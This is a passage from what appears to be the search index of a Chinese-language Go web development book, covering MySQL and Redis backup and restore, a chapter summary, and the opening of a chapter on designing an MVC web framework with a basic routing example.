<p>\u8bbe\u7f6e\u597d\u5c5e\u6027\u4e4b\u540e\uff0c\u628a\u547d\u4ee4\u52a0\u5165crontab\uff0c\u6211\u4eec\u8bbe\u7f6e\u4e86\u6bcf\u592900:00\u5b9a\u65f6\u81ea\u52a8\u5907\u4efd\uff0c\u7136\u540e\u628a\u5907\u4efd\u7684\u811a\u672c\u76ee\u5f55/var/www/mysql\u8bbe\u7f6e\u4e3arsync\u540c\u6b65\u76ee\u5f55\u3002</p> <pre><code>00 00 * * * /root/mysql_backup.sh\n</code></pre>"},{"location":"12.4/#mysql_1","title":"MySQL\u6062\u590d","text":"<p>\u524d\u9762\u4ecb\u7ecdMySQL\u5907\u4efd\u5206\u4e3a\u70ed\u5907\u4efd\u548c\u51b7\u5907\u4efd\uff0c\u70ed\u5907\u4efd\u4e3b\u8981\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u591f\u5b9e\u65f6\u7684\u6062\u590d\uff0c\u4f8b\u5982\u5e94\u7528\u670d\u52a1\u5668\u51fa\u73b0\u4e86\u786c\u76d8\u6545\u969c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u628a\u6570\u636e\u5e93\u7684\u8bfb\u53d6\u548c\u5199\u5165\u6539\u6210slave\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5c3d\u91cf\u5c11\u65f6\u95f4\u7684\u4e2d\u65ad\u670d\u52a1\u3002</p> <p>\u4f46\u662f\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u901a\u8fc7\u51b7\u5907\u4efd\u7684SQL\u6765\u8fdb\u884c\u6570\u636e\u6062\u590d\uff0c\u65e2\u7136\u6709\u4e86\u6570\u636e\u5e93\u7684\u5907\u4efd\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u5bfc\u5165\uff1a</p> <pre><code>mysql -u username -p databse &lt; backup.sql\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5bfc\u51fa\u548c\u5bfc\u5165\u6570\u636e\u5e93\u6570\u636e\u90fd\u662f\u76f8\u5f53\u7b80\u5355\uff0c\u4e0d\u8fc7\u5982\u679c\u8fd8\u9700\u8981\u7ba1\u7406\u6743\u9650\uff0c\u6216\u8005\u5176\u4ed6\u7684\u4e00\u4e9b\u5b57\u7b26\u96c6\u7684\u8bbe\u7f6e\u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u7a0d\u5fae\u590d\u6742\u4e00\u4e9b\uff0c\u4f46\u662f\u8fd9\u4e9b\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u547d\u4ee4\u6765\u5b8c\u6210\u7684\u3002</p>"},{"location":"12.4/#redis","title":"redis\u5907\u4efd","text":"<p>redis\u662f\u76ee\u524d\u6211\u4eec\u4f7f\u7528\u6700\u591a\u7684NoSQL\uff0c\u5b83\u7684\u5907\u4efd\u4e5f\u5206\u4e3a\u4e24\u79cd\uff1a\u70ed\u5907\u4efd\u548c\u51b7\u5907\u4efd\uff0credis\u4e5f\u652f\u6301master/slave\u6a21\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u70ed\u5907\u4efd\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5b9e\u73b0\uff0c\u76f8\u5e94\u7684\u914d\u7f6e\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003\u5b98\u65b9\u7684\u6587\u6863\u914d\u7f6e\uff0c\u76f8\u5f53\u7684\u7b80\u5355\u3002\u6211\u4eec\u8fd9\u91cc\u4ecb\u7ecd\u51b7\u5907\u4efd\u7684\u65b9\u5f0f\uff1aredis\u5176\u5b9e\u4f1a\u5b9a\u65f6\u7684\u628a\u5185\u5b58\u91cc\u9762\u7684\u7f13\u5b58\u6570\u636e\u4fdd\u5b58\u5230\u6570\u636e\u5e93\u6587\u4ef6\u91cc\u9762\uff0c\u6211\u4eec\u5907\u4efd\u53ea\u8981\u5907\u4efd\u76f8\u5e94\u7684\u6587\u4ef6\u5c31\u53ef\u4ee5\uff0c\u5c31\u662f\u5229\u7528\u524d\u9762\u4ecb\u7ecd\u7684rsync\u5907\u4efd\u5230\u975e\u672c\u5730\u673a\u623f\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002</p>"},{"location":"12.4/#redis_1","title":"redis\u6062\u590d","text":"<p>redis\u7684\u6062\u590d\u5206\u4e3a\u70ed\u5907\u4efd\u6062\u590d\u548c\u51b7\u5907\u4efd\u6062\u590d\uff0c\u70ed\u5907\u4efd\u6062\u590d\u7684\u76ee\u7684\u548c\u65b9\u6cd5\u540cMySQL\u7684\u6062\u590d\u4e00\u6837\uff0c\u53ea\u8981\u4fee\u6539\u5e94\u7528\u7684\u76f8\u5e94\u7684\u6570\u636e\u5e93\u8fde\u63a5\u5373\u53ef\u3002</p> <p>\u4f46\u662f\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u6839\u636e\u51b7\u5907\u4efd\u6765\u6062\u590d\u6570\u636e\uff0credis\u7684\u51b7\u5907\u4efd\u6062\u590d\u5176\u5b9e\u5c31\u662f\u53ea\u8981\u628a\u4fdd\u5b58\u7684\u6570\u636e\u5e93\u6587\u4ef6copy\u5230redis\u7684\u5de5\u4f5c\u76ee\u5f55\uff0c\u7136\u540e\u542f\u52a8redis\u5c31\u53ef\u4ee5\u4e86\uff0credis\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u52a0\u8f7d\u6570\u636e\u5e93\u6587\u4ef6\u5230\u5185\u5b58\u4e2d\uff0c\u542f\u52a8\u7684\u901f\u5ea6\u6839\u636e\u6570\u636e\u5e93\u7684\u6587\u4ef6\u5927\u5c0f\u6765\u51b3\u5b9a\u3002</p>"},{"location":"12.4/#_2","title":"\u5c0f\u7ed3","text":"<p>\u672c\u5c0f\u8282\u4ecb\u7ecd\u4e86\u6211\u4eec\u7684\u5e94\u7528\u90e8\u5206\u7684\u5907\u4efd\u548c\u6062\u590d\uff0c\u5373\u5982\u4f55\u505a\u597d\u707e\u5907\uff0c\u5305\u62ec\u6587\u4ef6\u7684\u5907\u4efd\u3001\u6570\u636e\u5e93\u7684\u5907\u4efd\u3002\u540c\u65f6\u4e5f\u4ecb\u7ecd\u4e86\u4f7f\u7528rsync\u540c\u6b65\u4e0d\u540c\u7cfb\u7edf\u7684\u6587\u4ef6\uff0cMySQL\u6570\u636e\u5e93\u548credis\u6570\u636e\u5e93\u7684\u5907\u4efd\u548c\u6062\u590d\uff0c\u5e0c\u671b\u901a\u8fc7\u672c\u5c0f\u8282\u7684\u4ecb\u7ecd\uff0c\u80fd\u591f\u7ed9\u4f5c\u4e3a\u5f00\u53d1\u7684\u4f60\u5bf9\u4e8e\u7ebf\u4e0a\u4ea7\u54c1\u7684\u707e\u5907\u65b9\u6848\u63d0\u4f9b\u4e00\u4e2a\u53c2\u8003\u65b9\u6848\u3002 </p>"},{"location":"12.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u5e94\u7528\u90e8\u7f72</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"12.5/","title":"12.5 \u5c0f\u7ed3","text":"<p>\u672c\u7ae0\u8ba8\u8bba\u4e86\u5982\u4f55\u90e8\u7f72\u548c\u7ef4\u62a4\u6211\u4eec\u5f00\u53d1\u7684Web\u5e94\u7528\u76f8\u5173\u7684\u4e00\u4e9b\u8bdd\u9898\u3002\u8fd9\u4e9b\u5185\u5bb9\u975e\u5e38\u91cd\u8981\uff0c\u8981\u521b\u5efa\u4e00\u4e2a\u80fd\u591f\u57fa\u4e8e\u6700\u5c0f\u7ef4\u62a4\u5e73\u6ed1\u8fd0\u884c\u7684\u5e94\u7528\uff0c\u5fc5\u987b\u8003\u8651\u8fd9\u4e9b\u95ee\u9898\u3002</p> <p>\u5177\u4f53\u800c\u8a00\uff0c\u672c\u7ae0\u8ba8\u8bba\u7684\u5185\u5bb9\u5305\u62ec\uff1a</p> <ul> <li>\u521b\u5efa\u4e00\u4e2a\u5f3a\u5065\u7684\u65e5\u5fd7\u7cfb\u7edf\uff0c\u53ef\u4ee5\u5728\u51fa\u73b0\u95ee\u9898\u65f6\u8bb0\u5f55\u9519\u8bef\u5e76\u4e14\u901a\u77e5\u7cfb\u7edf\u7ba1\u7406\u5458</li> <li>\u5904\u7406\u8fd0\u884c\u65f6\u53ef\u80fd\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u5305\u62ec\u8bb0\u5f55\u65e5\u5fd7\uff0c\u5e76\u5982\u4f55\u53cb\u597d\u7684\u663e\u793a\u7ed9\u7528\u6237\u7cfb\u7edf\u51fa\u73b0\u4e86\u95ee\u9898</li> <li>\u5904\u7406404\u9519\u8bef\uff0c\u544a\u8bc9\u7528\u6237\u8bf7\u6c42\u7684\u9875\u9762\u627e\u4e0d\u5230</li> <li>\u5c06\u5e94\u7528\u90e8\u7f72\u5230\u4e00\u4e2a\u751f\u4ea7\u73af\u5883\u4e2d(\u5305\u62ec\u5982\u4f55\u90e8\u7f72\u66f4\u65b0)</li> <li>\u5982\u4f55\u8ba9\u90e8\u7f72\u7684\u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u9ad8\u53ef\u7528</li> <li>\u5907\u4efd\u548c\u6062\u590d\u6587\u4ef6\u4ee5\u53ca\u6570\u636e\u5e93</li> </ul> <p>\u8bfb\u5b8c\u672c\u7ae0\u5185\u5bb9\u540e\uff0c\u5bf9\u4e8e\u4ece\u5934\u5f00\u59cb\u5f00\u53d1\u4e00\u4e2aWeb\u5e94\u7528\u9700\u8981\u8003\u8651\u90a3\u4e9b\u95ee\u9898\uff0c\u4f60\u5e94\u8be5\u5df2\u7ecf\u6709\u4e86\u5168\u9762\u7684\u4e86\u89e3\u3002\u672c\u7ae0\u5185\u5bb9\u5c06\u6709\u52a9\u4e8e\u4f60\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u7ba1\u7406\u524d\u9762\u5404\u7ae0\u4ecb\u7ecd\u5f00\u53d1\u7684\u4ee3\u7801\u3002</p>"},{"location":"12.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u5907\u4efd\u548c\u6062\u590d</li> <li>\u4e0b\u4e00\u8282: \u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2aWeb\u6846\u67b6</li> </ul>"},{"location":"13.0/","title":"13 \u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2aWeb\u6846\u67b6","text":"<p>\u524d\u9762\u5341\u4e8c\u7ae0\u4ecb\u7ecd\u4e86\u5982\u4f55\u901a\u8fc7Go\u6765\u5f00\u53d1Web\u5e94\u7528\uff0c\u4ecb\u7ecd\u4e86\u5f88\u591a\u57fa\u7840\u77e5\u8bc6\u3001\u5f00\u53d1\u5de5\u5177\u548c\u5f00\u53d1\u6280\u5de7\uff0c\u90a3\u4e48\u6211\u4eec\u8fd9\u4e00\u7ae0\u901a\u8fc7\u8fd9\u4e9b\u77e5\u8bc6\u6765\u5b9e\u73b0\u4e00\u4e2a\u7b80\u6613\u7684Web\u6846\u67b6\u3002\u901a\u8fc7Go\u8bed\u8a00\u6765\u5b9e\u73b0\u4e00\u4e2a\u5b8c\u6574\u7684\u6846\u67b6\u8bbe\u8ba1\uff0c\u8fd9\u6846\u67b6\u4e2d\u4e3b\u8981\u5185\u5bb9\u6709\u7b2c\u4e00\u5c0f\u8282\u4ecb\u7ecd\u7684Web\u6846\u67b6\u7684\u7ed3\u6784\u89c4\u5212\uff0c\u4f8b\u5982\u91c7\u7528MVC\u6a21\u5f0f\u6765\u8fdb\u884c\u5f00\u53d1\uff0c\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u8bbe\u8ba1\u7b49\u5185\u5bb9\uff1b\u7b2c\u4e8c\u5c0f\u8282\u4ecb\u7ecd\u6846\u67b6\u7684\u7b2c\u4e00\u4e2a\u529f\u80fd\uff1a\u8def\u7531\uff0c\u5982\u4f55\u8ba9\u8bbf\u95ee\u7684URL\u6620\u5c04\u5230\u76f8\u5e94\u7684\u5904\u7406\u903b\u8f91\uff1b\u7b2c\u4e09\u5c0f\u8282\u4ecb\u7ecd\u5904\u7406\u903b\u8f91\uff0c\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u516c\u5171\u7684controller\uff0c\u5bf9\u8c61\u7ee7\u627f\u4e4b\u540e\u5904\u7406\u51fd\u6570\u4e2d\u5982\u4f55\u5904\u7406response\u548crequest\uff1b\u7b2c\u56db\u5c0f\u8282\u4ecb\u7ecd\u6846\u67b6\u7684\u4e00\u4e9b\u8f85\u52a9\u529f\u80fd\uff0c\u4f8b\u5982\u65e5\u5fd7\u5904\u7406\u3001\u914d\u7f6e\u4fe1\u606f\u7b49\uff1b\u7b2c\u4e94\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u57fa\u4e8eWeb\u6846\u67b6\u5b9e\u73b0\u4e00\u4e2a\u535a\u5ba2\uff0c\u5305\u62ec\u535a\u6587\u7684\u53d1\u8868\u3001\u4fee\u6539\u3001\u5220\u9664\u3001\u663e\u793a\u5217\u8868\u7b49\u64cd\u4f5c\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e48\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u4f8b\u5b50\uff0c\u6211\u671f\u671b\u80fd\u591f\u8ba9\u8bfb\u8005\u4e86\u89e3\u5982\u4f55\u5f00\u53d1Web\u5e94\u7528\uff0c\u5982\u4f55\u642d\u5efa\u81ea\u5df1\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5982\u4f55\u5b9e\u73b0\u8def\u7531\uff0c\u5982\u4f55\u5b9e\u73b0MVC\u6a21\u5f0f\u7b49\u5404\u65b9\u9762\u7684\u5f00\u53d1\u5185\u5bb9\u3002\u5728\u6846\u67b6\u76db\u884c\u7684\u4eca\u5929\uff0cMVC\u4e5f\u4e0d\u518d\u662f\u795e\u8bdd\u3002\u7ecf\u5e38\u542c\u5230\u5f88\u591a\u7a0b\u5e8f\u5458\u8ba8\u8bba\u54ea\u4e2a\u6846\u67b6\u597d\uff0c\u54ea\u4e2a\u6846\u67b6\u4e0d\u597d\uff0c \u5176\u5b9e\u6846\u67b6\u53ea\u662f\u5de5\u5177\uff0c\u6ca1\u6709\u597d\u4e0e\u4e0d\u597d\uff0c\u53ea\u6709\u9002\u5408\u4e0e\u4e0d\u9002\u5408\uff0c\u9002\u5408\u81ea\u5df1\u7684\u5c31\u662f\u6700\u597d\u7684\uff0c\u6240\u4ee5\u6559\u4f1a\u5927\u5bb6\u81ea\u5df1\u52a8\u624b\u5199\u6846\u67b6\uff0c\u90a3\u4e48\u4e0d\u540c\u7684\u9700\u6c42\u90fd\u53ef\u4ee5\u7528\u81ea\u5df1\u7684\u601d\u8def\u53bb\u5b9e\u73b0\u3002</p>"},{"location":"13.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"13.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u5341\u4e8c\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u9879\u76ee\u89c4\u5212</li> </ul>"},{"location":"13.1/","title":"13.1 \u9879\u76ee\u89c4\u5212","text":"<p>\u505a\u4efb\u4f55\u4e8b\u60c5\u90fd\u9700\u8981\u505a\u597d\u89c4\u5212\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u5f00\u53d1\u535a\u5ba2\u7cfb\u7edf\u4e4b\u524d\uff0c\u540c\u6837\u9700\u8981\u505a\u597d\u9879\u76ee\u7684\u89c4\u5212\uff0c\u5982\u4f55\u8bbe\u7f6e\u76ee\u5f55\u7ed3\u6784\uff0c\u5982\u4f55\u7406\u89e3\u6574\u4e2a\u9879\u76ee\u7684\u6d41\u7a0b\u56fe\uff0c\u5f53\u6211\u4eec\u7406\u89e3\u4e86\u5e94\u7528\u7684\u6267\u884c\u8fc7\u7a0b\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u8bbe\u8ba1\u7f16\u7801\u5c31\u4f1a\u53d8\u5f97\u76f8\u5bf9\u5bb9\u6613\u4e86</p>"},{"location":"13.1/#gopath","title":"gopath\u4ee5\u53ca\u9879\u76ee\u8bbe\u7f6e","text":"<p>\u5047\u8bbe\u6307\u5b9agopath\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u666e\u901a\u76ee\u5f55\u540d\uff0c\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\u76ee\u5f55\u540d\uff0c\u7136\u540e\u5c06\u5176\u8def\u5f84\u5b58\u5165GOPATH\u3002\u524d\u9762\u4ecb\u7ecd\u8fc7GOPATH\u53ef\u4ee5\u662f\u591a\u4e2a\u76ee\u5f55\uff1a\u5728window\u7cfb\u7edf\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff1b\u5728linux/MacOS\u7cfb\u7edf\u53ea\u8981\u8f93\u5165\u7ec8\u7aef\u547d\u4ee4<code>export gopath=/home/astaxie/gopath</code>\uff0c\u4f46\u662f\u5fc5\u987b\u4fdd\u8bc1gopath\u8fd9\u4e2a\u4ee3\u7801\u76ee\u5f55\u4e0b\u9762\u6709\u4e09\u4e2a\u76ee\u5f55pkg\u3001bin\u3001src\u3002\u65b0\u5efa\u9879\u76ee\u7684\u6e90\u7801\u653e\u5728src\u76ee\u5f55\u4e0b\u9762\uff0c\u73b0\u5728\u6682\u5b9a\u6211\u4eec\u7684\u535a\u5ba2\u76ee\u5f55\u53eb\u505abeeblog\uff0c\u4e0b\u9762\u662f\u5728window\u4e0b\u7684\u73af\u5883\u53d8\u91cf\u548c\u76ee\u5f55\u7ed3\u6784\u7684\u622a\u56fe\uff1a</p> <p></p> <p>\u56fe13.1 \u73af\u5883\u53d8\u91cfGOPATH\u8bbe\u7f6e</p> <p></p> <p>\u56fe13.2 \u5de5\u4f5c\u76ee\u5f55\u5728$gopath/src\u4e0b</p>"},{"location":"13.1/#_1","title":"\u5e94\u7528\u7a0b\u5e8f\u6d41\u7a0b\u56fe","text":"<p>\u535a\u5ba2\u7cfb\u7edf\u662f\u57fa\u4e8e\u6a21\u578b-\u89c6\u56fe-\u63a7\u5236\u5668\u8fd9\u4e00\u8bbe\u8ba1\u6a21\u5f0f\u7684\u3002MVC\u662f\u4e00\u79cd\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u5c42\u548c\u8868\u73b0\u5c42\u8fdb\u884c\u5206\u79bb\u7684\u7ed3\u6784\u65b9\u5f0f\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u7531\u4e8e\u8868\u73b0\u5c42\u4eceGo\u4e2d\u5206\u79bb\u4e86\u51fa\u6765\uff0c\u6240\u4ee5\u5b83\u5141\u8bb8\u4f60\u7684\u7f51\u9875\u4e2d\u53ea\u5305\u542b\u5f88\u5c11\u7684\u811a\u672c\u3002</p> <ul> <li>\u6a21\u578b (Model) \u4ee3\u8868\u6570\u636e\u7ed3\u6784\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u6a21\u578b\u7c7b\u5c06\u5305\u542b\u53d6\u51fa\u3001\u63d2\u5165\u3001\u66f4\u65b0\u6570\u636e\u5e93\u8d44\u6599\u7b49\u8fd9\u4e9b\u529f\u80fd\u3002</li> <li>\u89c6\u56fe (View) \u662f\u5c55\u793a\u7ed9\u7528\u6237\u7684\u4fe1\u606f\u7684\u7ed3\u6784\u53ca\u6837\u5f0f\u3002\u4e00\u4e2a\u89c6\u56fe\u901a\u5e38\u662f\u4e00\u4e2a\u7f51\u9875\uff0c\u4f46\u662f\u5728Go\u4e2d\uff0c\u4e00\u4e2a\u89c6\u56fe\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u9875\u9762\u7247\u6bb5\uff0c\u5982\u9875\u5934\u3001\u9875\u5c3e\u3002\u5b83\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a RSS \u9875\u9762\uff0c\u6216\u5176\u5b83\u7c7b\u578b\u7684\u201c\u9875\u9762\u201d\uff0cGo\u5b9e\u73b0\u7684template\u5305\u5df2\u7ecf\u5f88\u597d\u7684\u5b9e\u73b0\u4e86View\u5c42\u4e2d\u7684\u90e8\u5206\u529f\u80fd\u3002</li> <li>\u63a7\u5236\u5668 (Controller) \u662f\u6a21\u578b\u3001\u89c6\u56fe\u4ee5\u53ca\u5176\u4ed6\u4efb\u4f55\u5904\u7406HTTP\u8bf7\u6c42\u6240\u5fc5\u987b\u7684\u8d44\u6e90\u4e4b\u95f4\u7684\u4e2d\u4ecb\uff0c\u5e76\u751f\u6210\u7f51\u9875\u3002</li> </ul> <p>\u4e0b\u56fe\u663e\u793a\u4e86\u9879\u76ee\u8bbe\u8ba1\u4e2d\u6846\u67b6\u7684\u6570\u636e\u6d41\u662f\u5982\u4f55\u8d2f\u7a7f\u6574\u4e2a\u7cfb\u7edf:</p> <p></p> <p>\u56fe13.3 \u6846\u67b6\u7684\u6570\u636e\u6d41</p> <ol> <li>main.go\u4f5c\u4e3a\u5e94\u7528\u5165\u53e3\uff0c\u521d\u59cb\u5316\u4e00\u4e9b\u8fd0\u884c\u535a\u5ba2\u6240\u9700\u8981\u7684\u57fa\u672c\u8d44\u6e90\uff0c\u914d\u7f6e\u4fe1\u606f\uff0c\u76d1\u542c\u7aef\u53e3\u3002</li> <li>\u8def\u7531\u529f\u80fd\u68c0\u67e5HTTP\u8bf7\u6c42\uff0c\u6839\u636eURL\u4ee5\u53camethod\u6765\u786e\u5b9a\u8c01(\u63a7\u5236\u5c42)\u6765\u5904\u7406\u8bf7\u6c42\u7684\u8f6c\u53d1\u8d44\u6e90\u3002</li> <li>\u5982\u679c\u7f13\u5b58\u6587\u4ef6\u5b58\u5728\uff0c\u5b83\u5c06\u7ed5\u8fc7\u901a\u5e38\u7684\u6d41\u7a0b\u6267\u884c\uff0c\u88ab\u76f4\u63a5\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\u3002</li> <li>\u5b89\u5168\u68c0\u6d4b\uff1a\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\u5668\u8c03\u7528\u4e4b\u524d\uff0cHTTP\u8bf7\u6c42\u548c\u4efb\u4e00\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u5c06\u88ab\u8fc7\u6ee4\u3002</li> <li>\u63a7\u5236\u5668\u88c5\u8f7d\u6a21\u578b\u3001\u6838\u5fc3\u5e93\u3001\u8f85\u52a9\u51fd\u6570\uff0c\u4ee5\u53ca\u4efb\u4f55\u5904\u7406\u7279\u5b9a\u8bf7\u6c42\u6240\u9700\u7684\u5176\u5b83\u8d44\u6e90\uff0c\u63a7\u5236\u5668\u4e3b\u8981\u8d1f\u8d23\u5904\u7406\u4e1a\u52a1\u903b\u8f91\u3002</li> <li>\u8f93\u51fa\u89c6\u56fe\u5c42\u4e2d\u6e32\u67d3\u597d\u7684\u5373\u5c06\u53d1\u9001\u5230Web\u6d4f\u89c8\u5668\u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c\u5f00\u542f\u7f13\u5b58\uff0c\u89c6\u56fe\u9996\u5148\u88ab\u7f13\u5b58\uff0c\u5c06\u7528\u4e8e\u4ee5\u540e\u7684\u5e38\u89c4\u8bf7\u6c42\u3002</li> </ol>"},{"location":"13.1/#_2","title":"\u76ee\u5f55\u7ed3\u6784","text":"<p>\u6839\u636e\u4e0a\u9762\u7684\u5e94\u7528\u7a0b\u5e8f\u6d41\u7a0b\u8bbe\u8ba1\uff0c\u535a\u5ba2\u7684\u76ee\u5f55\u7ed3\u6784\u8bbe\u8ba1\u5982\u4e0b\uff1a</p> <pre><code>|\u2014\u2014main.go         \u5165\u53e3\u6587\u4ef6\n|\u2014\u2014conf            \u914d\u7f6e\u6587\u4ef6\u548c\u5904\u7406\u6a21\u5757\n|\u2014\u2014controllers     \u63a7\u5236\u5668\u5165\u53e3\n|\u2014\u2014models          \u6570\u636e\u5e93\u5904\u7406\u6a21\u5757\n|\u2014\u2014utils           \u8f85\u52a9\u51fd\u6570\u5e93\n|\u2014\u2014static          \u9759\u6001\u6587\u4ef6\u76ee\u5f55\n|\u2014\u2014views           \u89c6\u56fe\u5e93\n</code></pre>"},{"location":"13.1/#_3","title":"\u6846\u67b6\u8bbe\u8ba1","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u535a\u5ba2\u7684\u5feb\u901f\u642d\u5efa\uff0c\u6253\u7b97\u57fa\u4e8e\u4e0a\u9762\u7684\u6d41\u7a0b\u8bbe\u8ba1\u5f00\u53d1\u4e00\u4e2a\u6700\u5c0f\u5316\u7684\u6846\u67b6\uff0c\u6846\u67b6\u5305\u62ec\u8def\u7531\u529f\u80fd\u3001\u652f\u6301REST\u7684\u63a7\u5236\u5668\u3001\u81ea\u52a8\u5316\u7684\u6a21\u677f\u6e32\u67d3\uff0c\u65e5\u5fd7\u7cfb\u7edf\u3001\u914d\u7f6e\u7ba1\u7406\u7b49\u3002</p>"},{"location":"13.1/#_4","title":"\u603b\u7ed3","text":"<p>\u672c\u5c0f\u8282\u4ecb\u7ecd\u4e86\u535a\u5ba2\u7cfb\u7edf\u4ece\u8bbe\u7f6eGOPATH\u5230\u76ee\u5f55\u5efa\u7acb\u8fd9\u6837\u7684\u57fa\u7840\u4fe1\u606f\uff0c\u4e5f\u7b80\u5355\u4ecb\u7ecd\u4e86\u6846\u67b6\u7ed3\u6784\u91c7\u7528\u7684MVC\u6a21\u5f0f\uff0c\u535a\u5ba2\u7cfb\u7edf\u4e2d\u6570\u636e\u6d41\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u6700\u540e\u901a\u8fc7\u8fd9\u4e9b\u6d41\u7a0b\u8bbe\u8ba1\u4e86\u535a\u5ba2\u7cfb\u7edf\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u81f3\u6b64\uff0c\u6211\u4eec\u57fa\u672c\u5b8c\u6210\u4e00\u4e2a\u6846\u67b6\u7684\u642d\u5efa\uff0c\u63a5\u4e0b\u6765\u7684\u51e0\u4e2a\u5c0f\u8282\u6211\u4eec\u5c06\u4f1a\u9010\u4e2a\u5b9e\u73b0\u3002</p>"},{"location":"13.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u6784\u5efa\u535a\u5ba2\u7cfb\u7edf</li> <li>\u4e0b\u4e00\u8282: \u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1</li> </ul>"},{"location":"13.2/","title":"13.2 \u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1","text":""},{"location":"13.2/#http","title":"HTTP\u8def\u7531","text":"<p>HTTP\u8def\u7531\u7ec4\u4ef6\u8d1f\u8d23\u5c06HTTP\u8bf7\u6c42\u4ea4\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u5904\u7406(\u6216\u8005\u662f\u4e00\u4e2astruct\u7684\u65b9\u6cd5)\uff0c\u5982\u524d\u9762\u5c0f\u8282\u6240\u63cf\u8ff0\u7684\u7ed3\u6784\u56fe\uff0c\u8def\u7531\u5728\u6846\u67b6\u4e2d\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u5668\uff0c\u800c\u8fd9\u4e2a\u4e8b\u4ef6\u5305\u62ec\uff1a</p> <ul> <li>\u7528\u6237\u8bf7\u6c42\u7684\u8def\u5f84(path)(\u4f8b\u5982:/user/123,/article/123)\uff0c\u5f53\u7136\u8fd8\u6709\u67e5\u8be2\u4e32\u4fe1\u606f(\u4f8b\u5982?id=11)</li> <li>HTTP\u7684\u8bf7\u6c42\u65b9\u6cd5(method)(GET\u3001POST\u3001PUT\u3001DELETE\u3001PATCH\u7b49)</li> </ul> <p>\u8def\u7531\u5668\u5c31\u662f\u6839\u636e\u7528\u6237\u8bf7\u6c42\u7684\u4e8b\u4ef6\u4fe1\u606f\u8f6c\u53d1\u5230\u76f8\u5e94\u7684\u5904\u7406\u51fd\u6570(\u63a7\u5236\u5c42)\u3002</p>"},{"location":"13.2/#_1","title":"\u9ed8\u8ba4\u7684\u8def\u7531\u5b9e\u73b0","text":"<p>\u57283.4\u5c0f\u8282\u6709\u8fc7\u4ecb\u7ecdGo\u7684http\u5305\u7684\u8be6\u89e3\uff0c\u91cc\u9762\u4ecb\u7ecd\u4e86Go\u7684http\u5305\u5982\u4f55\u8bbe\u8ba1\u548c\u5b9e\u73b0\u8def\u7531\uff0c\u8fd9\u91cc\u7ee7\u7eed\u4ee5\u4e00\u4e2a\u4f8b\u5b50\u6765\u8bf4\u660e\uff1a <pre><code>func fooHandler(w http.ResponseWriter, r *http.Request) {\nfmt.Fprintf(w, \"Hello, %q\", html.EscapeString(r.URL.Path))\n}\n\nhttp.HandleFunc(\"/foo\", fooHandler)\n\nhttp.HandleFunc(\"/bar\", func(w http.ResponseWriter, r *http.Request) {\nfmt.Fprintf(w, \"Hello, %q\", html.EscapeString(r.URL.Path))\n})\n\nlog.Fatal(http.ListenAndServe(\":8080\", nil))\n</code></pre> 